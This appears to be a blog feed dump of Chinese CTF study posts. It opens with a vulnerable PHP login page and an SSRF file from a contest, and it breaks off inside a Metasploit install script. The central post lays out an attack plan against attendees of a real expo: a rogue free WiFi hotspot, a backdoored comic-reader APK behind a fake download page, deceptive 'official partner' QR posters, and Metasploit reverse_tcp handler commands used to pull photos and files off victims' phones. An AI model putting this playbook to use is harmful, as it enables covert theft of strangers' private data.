class="string">&#x27;ctfer&#x27;</span>;</span><br><span class="line">    <span class="variable">$dbpass</span> = <span class="string">&#x27;efrsyu578h7845g67&#x27;</span>;</span><br><span class="line">    <span class="variable">$conn</span> = <span class="title function_ invoke__">mysqli_connect</span>(<span class="variable">$dbhost</span>, <span class="variable">$dbuser</span>, <span class="variable">$dbpass</span>, <span class="string">&#x27;babysql&#x27;</span>);</span><br><span class="line">    <span class="keyword">if</span>(! <span class="variable">$conn</span> )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;database connection failed: &#x27;</span> . <span class="title function_ invoke__">mysqli_error</span>(<span class="variable">$conn</span>));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$sql</span> = <span class="string">&quot;SELECT * from users where username=&#x27;<span class="subst">$username</span>&#x27; and password=&#x27;<span class="subst">$password</span>&#x27;&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">strstr</span>(<span class="variable">$sql</span>, <span class="string">&#x27;#&#x27;</span>) <span class="keyword">or</span> <span class="title function_ invoke__">strstr</span>(<span class="variable">$sql</span>, <span class="string">&#x27;\&#x27;&#x27;</span>))<span class="comment"># 这里就是我加上的</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;?????&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123; </span><br><span class="line">        <span class="variable">$retval</span> = <span class="title function_ invoke__">mysqli_query</span>( <span class="variable">$conn</span>, <span class="variable">$sql</span> );</span><br><span class="line">    &#125;</span><br><span class="line">   </span><br><span class="line"></span><br><span class="line"><span class="comment">// 光改密码不会好的：）建议你去修修 SQL 注入，和另外一个文件里的那个漏洞</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$retval</span>-&gt;num_rows &gt; <span class="number">0</span>)&#123;</span><br><span class="line"><span class="variable">$row</span> = <span class="variable">$retval</span>-&gt;<span class="title function_ invoke__">fetch_row</span>();</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$row</span>[<span class="number">1</span>] === <span class="string">&quot;b641c90e-459e-4670-a3a9-671f2453400b&quot;</span>) &#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&#x27;login successful! this is you flag!  &#x27;</span>.<span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;/flllllaaaaaaggggg&#x27;</span>));</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">    <span class="title function_ invoke__">mysqli_close</span>(<span class="variable">$conn</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>然后打开另一个<code>y0u_nev3r_gue5s_1t.php</code>文件</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$url</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/file|dict/i&quot;</span>,<span class="variable">$url</span>))&#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&quot;?????&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$url</span>)&#123;</span><br><span class="line"><span class="variable">$ch</span> = <span class="title function_ invoke__">curl_init</span>();</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_URL, <span class="variable">$url</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_HEADER, <span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_exec</span>(<span class="variable">$ch</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_close</span>(<span class="variable">$ch</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>打开就看到了熟悉的<code>curl</code>命令，我就在想应该是这里的问题，然后就在if里面加了条件，改成了下面这样</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="variable">$url</span> <span class="keyword">and</span> <span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/http:\/\//i&quot;</span>,<span class="variable">$url</span>) <span class="keyword">and</span> !<span class="title function_ invoke__">strstr</span>(<span class="variable">$url</span>, <span class="string">&#x27;&amp;&amp;&#x27;</span>) <span class="keyword">and</span> !<span class="title function_ invoke__">strstr</span>(<span class="variable">$url</span>, <span class="string">&#x27;|&#x27;</span>))&#123;</span><br><span class="line"><span class="variable">$ch</span> = <span class="title function_ invoke__">curl_init</span>();</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_URL, <span class="variable">$url</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_HEADER, <span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_exec</span>(<span class="variable">$ch</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_close</span>(<span class="variable">$ch</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>改完啦！上传，等待check，然后发现check没通过（三轮都是）</p><h4 id="joomla-fix"><a href="#joomla-fix" class="headerlink" title="joomla-fix"></a>joomla-fix</h4><p>这是一个CMS框架，在群里，管理员提醒了一句：</p><blockquote><p>WEB-Joomla 提示2：别直接把文件上传功能干掉，管理员还要用的，所以或许你需要对文件上传功能点加固一下：）</p></blockquote><p>所以应该是文件管理一类的考点，奈何没时间而且技术力不足，搞不定</p><h4 id="EzRome-1"><a href="#EzRome-1" class="headerlink" title="EzRome"></a>EzRome</h4><p>下载下来是个jar文件，奈何不住我不会Java啊</p><hr><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>第一年嘛，积累经验啦；隔壁队伍一个都没做出来，我至少fix还做出来了一个，稳坐三等奖啦！</p><p><strong>明年继续</strong></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF学习笔记（大学篇）06 —— 实战！在拟定的背景下运用社工和后门程序获取用户手机上的内容</title>
      <link href="/posts/CTF-in-College-6/"/>
      <url>/posts/CTF-in-College-6/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>这是一次结合了前几次文章里面介绍的各种方法来做的一次实战（主要是有讲座啥的挤在一起了，然后顺带就拿出来实战了一下），那么话不多说，我们现在开始！</p><hr><div class="note danger flat"><h2 id="所有未经允许的入侵均违法！！！"><a href="#所有未经允许的入侵均违法！！！" class="headerlink" title="所有未经允许的入侵均违法！！！"></a>所有未经允许的入侵均违法！！！</h2></div><h2 id="情景拟定"><a href="#情景拟定" class="headerlink" title="情景拟定"></a>情景拟定</h2><p>假设现在即将迎来中国国际数码互动娱乐展览会（ChinaJoy，简称CJ），而你想要获取在场的用户手机中的某些文件。自然，直接向别人询问肯定是不合理的。此时我们想：能否通过网络直接访问到别人手机的文件，然后把我们需要的文件下载下来呢？</p><p>结合我前面几篇文章写的，我就想到可以通过社工手段诱导用户下载木马程序并安装运行，从而获取用户手机的控制权限，进而能够找到我们需要的文件并且下载下来这样的手段</p><h2 id="方案拟定"><a href="#方案拟定" class="headerlink" title="方案拟定"></a>方案拟定</h2><p>社工手段分很多种，社工库（这个真没办法，背后的原因很多样）、钓鱼网站（Steam高价值库存会遇到很多）等等等等，但既然是一个区域内的社工，首先想到的就是公共WIFI。因为本来就是个广Door人，花生地铁WIFI用的超级多<img src="http://www.wifi8.com/images/logo.png" alt="花生地铁WIFI">（特别是之前流量的价格实在是伤不起的时候，但现在印象中不是有名无实就是直接没有了)</p><p>另外，像天河城之类的地方有什么<code>aWifi</code>、<code>freewifi</code>之类的，肯德基有<code>KFCFreeWifi</code>，麦当劳有<code>MCDonloads</code>，公共wifi渗透在我们生活的方方面面，虽然流量在逐渐取代他们，但是其实还是有人用的，而我们也可以开一个免费热点给其他人使用，特别是在我们这个情景（CJ会场）下</p><p>同时在会场中，我们粘贴有带后门软件的二维码的海报，并用<code>官方合作伙伴</code>等字眼吸引他人的眼球，在现场的人就很有可能会去尝试下载我们的后门软件并安装使用，这时候就形成了<strong>被动式肉鸡上线</strong>，我们能够在我们的服务器上对肉鸡进行远程控制，包括读取通讯录、信息等，甚至是读取文件（当然要有对应的权限）</p><h2 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h2><h3 id="树莓派开启WIFI热点"><a href="#树莓派开启WIFI热点" class="headerlink" title="树莓派开启WIFI热点"></a>树莓派开启WIFI热点</h3><p>这里采用Github上面的<code>create_ap</code>项目（项目链接在下面），虽然没有维护了，但是这不影响我们使用呀</p><p><a href="https://github.com/oblique/create_ap">oblique&#x2F;create_ap: [NOT MAINTAINED] This script creates a NATed or Bridged WiFi Access Point.</a></p><p>首先得先clone下来，要不然我们咋用呢</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/oblique/create_ap.git</span><br></pre></td></tr></table></figure><p>然后我们进入clone下来的目录，进行编译</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> create_ap</span><br><span class="line">make install</span><br></pre></td></tr></table></figure><p>这个过程中可能会提示权限不足，改为<code>root</code>账户运行或者直接<code>sudo</code>都行</p><p>完成以后，就会在当前目录生成一个名为<code>create_ap</code>的二进制可执行文件，直接运行即可，可以像下面这样运行</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo ./create_ap wlan1 wlan0 FreeWifi</span><br></pre></td></tr></table></figure><p>这样会创建一个名为<code>FreeWifi</code>的免费热点，当然你可以在FreeWifi后加上密码让它变成一个加密热点，结合我们这里的情景，我就把WIFI命名为<code>CimocFreeWifi</code>了</p><h3 id="制作后门程序"><a href="#制作后门程序" class="headerlink" title="制作后门程序"></a>制作后门程序</h3><p>MSF创建后门程序的过程不再多讲，请参考<a href="/posts/CTF-in-College-5/#%E7%94%A8520apkhook%E5%88%9B%E5%BB%BA%E5%B8%A6%E6%9C%89%E5%90%8E%E9%97%A8%E7%9A%84apk%E6%96%87%E4%BB%B6">CTF学习笔记（大学篇）05 —— 通过msfconsole和520apkhook创建带有后门程序的安卓程序 | GamerNoTitle</a></p><p>对于<code>520apkhook</code>，这里就简略地讲一下</p><p>这里我用520apkhook去对Cimoc这个漫画查看软件进行后门注入，首先当然要去下载这个软件</p><p>我这里下载的版本是<code>v1.5.5</code>（主要是这个是测试的最后一版，而且没有更新提示，一旦我们注入后门对apk进行重签名，用户下载官方最新的apk就会装不上，当然如果包名不同就没这茬事），也非常幸运，在520apkhook的自动模式下就能够找到<code>onCreate()V</code>这个切入点，自动注入</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python3 main.py --lhost &lt;公网云服务器IP（这里不公布）&gt; --lport 5555 -n Cimoc.apk</span><br><span class="line"><span class="comment"># 格式为 --lhost 监听服务器地址 --lport 监听服务端口 -n 需要注入的apk文件 -m &#123;1|2|3&#125;模式选择，默认为1</span></span><br></pre></td></tr></table></figure><p>注入后把我们的文件拿出来，先放在一个文件夹里面，一会会用到</p><h3 id="制作下载页"><a href="#制作下载页" class="headerlink" title="制作下载页"></a>制作下载页</h3><p>下载页本来想用酷安官方的那个下载页，但是后来想想要改的话太麻烦了，就去Github找了一个项目</p><p>然后找到了这个<a href="https://github.com/FEMessage/app-download">FEMessage&#x2F;app-download: build your app’s download page easily (github.com)</a></p><p>这个用了nodejs的yarn框架，可以比较方便地生成下载页</p><p>当然我是不用<code>yarn</code>的，所以要先安装一下<code>yarn</code>（npm安装慢可以用cnpm）</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install yarn -g</span><br></pre></td></tr></table></figure><p>然后再根据文档来操作，修改相关的文件</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;title&quot;</span><span class="punctuation">:</span><span class="string">&quot;Cimoc&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;logo&quot;</span><span class="punctuation">:</span> <span class="string">&quot;https://cdn.bili33.top/gh/Haleydu/Cimoc@release-tci/screenshot/icon.png&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;app&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">    <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;platform&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Android&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;downloadLink&quot;</span><span class="punctuation">:</span><span class="string">&quot;//cdn.bili33.top/gh/Vikutorika/FakeDownloadPage@master/app-release.apk&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;qrcode&quot;</span><span class="punctuation">:</span> <span class="keyword">true</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;icon&quot;</span><span class="punctuation">:</span> <span class="string">&quot;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAADQAAABABAMAAACn5UkPAAAAG1BMVEUAAABfvRlfvRlfvRlfvRlfvRlfvRlfvRlfvRlkC4P+AAAACHRSTlMA6pIhuRVbiHyD9QIAAAEFSURBVHgB7ZQ9TwMxDIbdpiDGQoWUsd069gTDjZxgYIQBifE2GJk611U//LPrJJde7JwyIKaKd7F1j2L7HDvQqVlFr3oCKTvrHGOnClW4Us5Zxs6+Gosv6/Px5BgFYauJee0Q7XTA70iIDpKMe0I0F2iZom1KrjnFh8/mTVrJO9EePh3y5l7G20MdUC0iXlmO9BACOoNvaSqpdrh0Wf5Eo/5eRhr19zK6ZdkEbeD3Gts7uNG5NrDAuWvET474d47A2ac54poRnJMj9+UfXQ4qDEBhbArD5jSAov4cFfarsJXGSpI+iY+C4bPcs5Dc907rUpGbEd9ozJCbEf8yHgcfJFacCdYJpVD+0W2qrN4AAAAASUVORK5CYII=&quot;</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line">  <span class="punctuation">]</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>分别把软件名、软件logo、软件下载地址给修改了（其实里面本来还有iOS的，但是我们没做iOS所以就被我删了）</p><p>接着运行<code>yarn</code>标准命令生成（当然在生成前可以用<code>yarn dev</code>来本地查看一下）</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">yarn</span><br><span class="line">yarn build</span><br></pre></td></tr></table></figure><p>生成后的文件会在<code>./dist</code>文件夹（其实nodejs好像都是这个样子的），把里面的文件拿出来，顺带把我们的apk命名为标准的<code>app-release.apk</code>，放在同级目录下，上传到Github，并开启Github Pages功能来让我们的网页能够被公网访问，当然因为<code>github.io</code>的访问情况不太好，我还绑定了一个自定义域名（我就不放出来了，省的有人给我举报一下然后CloudFlare送我红色警告页面）</p><h3 id="后门服务器设置"><a href="#后门服务器设置" class="headerlink" title="后门服务器设置"></a>后门服务器设置</h3><p>首先要安装msfvenom，安装的过程请参照<a href="/posts/CTF-in-College-5/#%E5%9C%A8Ubuntu%E5%AE%89%E8%A3%85Msfvenom">CTF学习笔记（大学篇）05 —— 通过msfconsole和520apkhook创建带有后门程序的安卓程序 | GamerNoTitle</a>（kali可以不装，自带了）</p><p>然后我们运行<code>sudo msfconsole</code>，就会打开msf软件</p><p>此时我们直接运行相关命令即可</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/handler</span><br><span class="line"><span class="built_in">set</span> payload android/meterpreter/reverse_tcp</span><br><span class="line"><span class="built_in">set</span> AutoLoadStdapi <span class="literal">true</span></span><br><span class="line"><span class="built_in">set</span> LHOST 0.0.0.0</span><br><span class="line"><span class="built_in">set</span> LPORT 5555</span><br><span class="line"><span class="built_in">set</span> exitonsession <span class="literal">false</span></span><br><span class="line">exploit -j </span><br></pre></td></tr></table></figure><p>会打开监听器，当肉鸡上线的时候会有提示就可以进行控制了</p><h3 id="海报制作"><a href="#海报制作" class="headerlink" title="海报制作"></a>海报制作</h3><p>这个真的没啥说的，网上一搜一大堆，也没有什么技术含量，略过</p><h2 id="攻击流程"><a href="#攻击流程" class="headerlink" title="攻击流程"></a>攻击流程</h2><p>首先我们将我们的树莓派设备放在场馆内，打开<code>create_ap</code>，并将WIFI命名为<code>CimocFreeWifi</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo ./create_ap wlan1 wlan0 CimocFreeWifi</span><br></pre></td></tr></table></figure><p>将海报粘贴到位，然后等待肉鸡上钩，看到监听服务器有提示后，使用<code>sessions</code>进入设备控制</p><p>因为软件一打开就说明了为啥要存储权限（这个是软件自带的不是我注入造成的），所以大部分用户都会授予存储权限</p><p>我们可以利用meterpreter的<code>download</code>命令来下载设备上的文件</p><p>这里需要对安卓设备的目录结构进行说明：设备的内部存储空间挂载在了<code>/sdcard</code>上，我们平时的设备照片存放在<code>/sdcard/DCIM</code>文件夹，官方相机会放在<code>/sdcard/DCIM/Camera</code>，屏幕截图在<code>/sdcard/DCIM/Camera</code>，如果用的是第三方的相机，例如B612，就会在<code>/sdcard/DCIM/B612</code>文件夹</p><p>所以如果我们要下载照片的话就可以在这些目录进行寻找，使用<code>ls</code>命令可以看到当前目录的文件，使用<code>pwd</code>命令可以看到当前所在的目录</p><p>当然也可以通过<code>shell</code>来获得一个安卓的shell程序（显然不如adb好用），可以用来运行shell脚本之类的东西</p><p>找到了我们所需要的文件，使用<code>download</code>命令可以将文件下载到本地，使用<code>upload</code>可以将本地文件上传到目标机器（上传shell脚本来维持权限啥的）</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux踩坑记录：为什么我的sudo反应这么慢</title>
      <link href="/posts/Why-my-sudo-is-so-slow/"/>
      <url>/posts/Why-my-sudo-is-so-slow/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>在用Kali的时候，用的最多的东西就是<code>sudo</code>了，但是在使用的过程中我发现一个问题：我在使用<code>sudo</code>的时候要等个半分钟到两分钟的时间才会让我输入密码，但是刚刚安装好kali的时候就不存在这个问题</p><p><img src="https://cdn.bili33.top/gh/Vikutorika/assets@master/img/Why-my-sudo-is-so-slow/vmware-20220609-222706.png?download=true"></p><p>当我在百度搜索的时候，我发现了有一种情况非常贴合我的kali：修改过hosts（<code>/etc/hosts</code>）文件</p><p>按照百度出来的结果描述，当使用<code>sudo</code>的时候，会先去寻找主机地址，而hosts文件中有几行就是写了主机地址的</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1localhost</span><br><span class="line">127.0.1.1kali-vmware# 这个是主机名，我这里在VMware上面装的而且命名为kali-vmware</span><br><span class="line"></span><br><span class="line"># The following lines are desirable for IPv6 capable hosts</span><br><span class="line">::1     localhost ip6-localhost ip6-loopback</span><br><span class="line">ff02::1 ip6-allnodes</span><br><span class="line">ff02::2 ip6-allrouters</span><br></pre></td></tr></table></figure><p>我打开我的<code>hosts</code>文件，因为之前修改过，后来被我删掉后重新<code>touch</code>了一次，所以是空的，我把这几行加回去后，诶，正常了</p><p><strong>经验教训：不要随便删掉<code>hosts</code>文件</strong></p>]]></content>
      
      
      <categories>
          
          <category> Tech </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Tech </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF学习笔记（大学篇）05 —— 通过msfconsole和520apkhook创建带有后门程序的安卓程序</title>
      <link href="/posts/CTF-in-College-5/"/>
      <url>/posts/CTF-in-College-5/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p><strong>本文所用项目链接</strong></p><p><a href="https://github.com/ba0gu0/520apkhook">ba0gu0&#x2F;520apkhook: 把msf生成的安卓远控附加进普通的app中，并进行加固隐藏特征。可以绕过常见的手机安全管家。 (github.com)</a></p><hr><h2 id="在Ubuntu安装Msfvenom"><a href="#在Ubuntu安装Msfvenom" class="headerlink" title="在Ubuntu安装Msfvenom"></a>在Ubuntu安装Msfvenom</h2><p>本来我想着能不能通过apt安装的，毕竟也是个软件包嘛（Kali就带了），然后我尝试运行</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install msfvenom -y</span><br></pre></td></tr></table></figure><p>结果告诉我找不到，只好求助于万能的Bing</p><p>首先我们需要把下面的这些内容保存到一个文件中（文件名随意）</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="title">print_pgp_key</span></span>() &#123;</span><br><span class="line">  <span class="built_in">cat</span> &lt;&lt;-<span class="string">EOF</span></span><br><span class="line"><span class="string">-----BEGIN PGP PUBLIC KEY BLOCK-----</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">mQINBFDAy/0BEAC8I5bw5gLQqHKx5JCacYcXFL6AZowl3qIOTxo5yfBl8CepNpWY</span></span><br><span class="line"><span class="string">OOERvIUJb17WehhhbWOo9WjpBalDXBRtI1NvfArewOT8fLm7BdhYe8U45moBfkYi</span></span><br><span class="line"><span class="string">xFtNrPw3pdIltHQISrB8PufhliN8obQuq0rcxYV8NblvYo4gIGNjBfO1QGvBNmp7</span></span><br><span class="line"><span class="string">kBtjlAuZguScZmUTdPOwfv8fqN52X9tCv1ahQk1hg8XG9YwW0vXb5z93jkLXBb5b</span></span><br><span class="line"><span class="string">sRCnou4m9IV6vOv2HVNRyMKT7uht3z4FqflP9NkySl4daCdZgmXbf169vvLdwLrC</span></span><br><span class="line"><span class="string">lVymwAbwvuyILZv4JW1w0Kx8nWiTuK5A886882i83lxnkh1vC9jInva4/5hTrbRw</span></span><br><span class="line"><span class="string">XJb7qOyh7sxa5GOfgq1NwVfLkrvVCMystrPu18sF1ORfg1UTFcz86RYdxpmoZvk7</span></span><br><span class="line"><span class="string">EeABiLCQDZKOf0fV3U9CxLj8gXPjPY1Lu6udZUN6NG1ALJjsPkGnbpQEqEJlKNAG</span></span><br><span class="line"><span class="string">+rF+tp73TrG0PW8C/THL7fN93ET3wn5tfNu86Liui9wd8ZLuPJNEYeE6eyPAgXJ4</span></span><br><span class="line"><span class="string">p69Yb4ou5um5jWnzaVameECBZvtc4HOhy3nTEiVMDcKv/o8XxKOCLpjW1RSDirKl</span></span><br><span class="line"><span class="string">ZRIsJYPx2yuJSVMCsN5Sghp5+OCsQ+On4OFWxCskemvy97ftkv/fwUI7mQARAQAB</span></span><br><span class="line"><span class="string">tCJNZXRhc3Bsb2l0IDxtZXRhc3Bsb2l0QHJhcGlkNy5jb20+iQJUBBMBCAA+AhsD</span></span><br><span class="line"><span class="string">BQsJCAcDBRUKCQgLBRYCAwEAAh4BAheAFiEECeVfr094Ys1tVYmXzftfpSAHuVQF</span></span><br><span class="line"><span 